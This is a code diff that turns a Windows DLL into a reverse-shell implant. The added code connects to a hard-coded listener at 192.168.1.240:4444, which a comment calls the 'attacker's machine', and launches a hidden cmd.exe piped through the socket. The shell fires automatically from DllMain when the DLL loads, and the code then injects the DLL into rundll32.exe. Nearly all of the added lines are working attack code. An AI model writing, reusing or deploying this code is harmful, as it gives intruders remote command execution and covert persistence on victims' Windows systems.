@@ -1,42 +1,59 @@
+#include <winsock2.h>
+#include <stdio.h>
 #include "tools.h"
-BOOL was_dllmain_called = FALSE;
-DWORD dll_param;
+#pragma comment(lib, "ws2_32")
 
-LPSTR target_path = "C:\\Windows\\System32\\conhost.exe";
+int reverse(void) {
+	WSADATA wsaData;
+	SOCKET wSock;
+	struct sockaddr_in sock;
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+
+	// listener ip, port on attacker's machine
+	char* ip = "192.168.1.240";
+	short port = 4444;
+
+	// init socket lib
+	WSAStartup(MAKEWORD(2, 2), &wsaData);
+
+	// create socket
+	wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+
+	sock.sin_family = AF_INET;
+	sock.sin_port = htons(port);
+	sock.sin_addr.s_addr = inet_addr(ip);
+
+	// connect to remote host
+	WSAConnect(wSock, (SOCKADDR*)&sock, sizeof(sock), NULL, NULL, NULL, NULL);
+
+	memset(&si, 0, sizeof(si));
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESTDHANDLES;
+	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)wSock;
+
+	// start cmd.exe with redirected streams
+	CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+	exit(0);
+}
 
 extern "C" __declspec(dllexport) void FunEntry() {
+	LPSTR target_path = "C:\\Windows\\System32\\rundll32.exe";
+	DWORD dll_param;
 	char dll_path[MAX_PATH];
 	DWORD ret = GetModuleFileNameA((HINSTANCE)dll_param, dll_path, MAX_PATH);
-	char test[1024];
-	wsprintfA(test, "%s", dll_path);
-	MessageBoxA(0, test, "", 0);
-	// inject dll
+	reverse();
 	Tools::AutoInject(target_path, dll_path);
 }
 
 BOOL APIENTRY DllMain(HMODULE Base, DWORD Callback, LPVOID Param) {
-	dll_param = (DWORD)Base;
-	was_dllmain_called = TRUE;
-
 	switch (Callback) {
 	case DLL_PROCESS_ATTACH:
-
-		break;
+		FunEntry();
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
 	case DLL_PROCESS_DETACH:
-
 		break;
 	}
 	return TRUE;
-}
-
-extern "C" __declspec(dllexport) void MainBitch() {
-	if (was_dllmain_called) {
-		while (TRUE) {
-			char exe[MAX_PATH + 1];
-			GetModuleFileNameA(0, exe, sizeof(exe));
-			MessageBoxA(0, exe, "I am inside: ", 0);
-		}
-	} else {
-		MessageBoxA(NULL, "DLLMain was not called", NULL, 0);
-	}
 }
